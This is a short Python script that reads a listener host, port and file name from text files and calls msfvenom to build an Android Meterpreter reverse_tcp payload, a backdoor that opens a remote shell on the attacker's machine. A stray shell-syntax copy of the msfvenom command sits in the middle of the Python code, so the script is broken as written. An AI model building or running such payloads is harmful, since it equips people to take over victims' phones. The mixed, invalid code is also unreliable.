import os
with open('lhost.txt', 'r') as myfile:
  lhost = myfile.read()
with open('lport.txt', 'r') as myfile:
  lport = myfile.read()
with open('outn.txt', 'r') as myfile:
  outn = myfile.read()
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $output_name
cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" R > "+outn
os.system(cmd)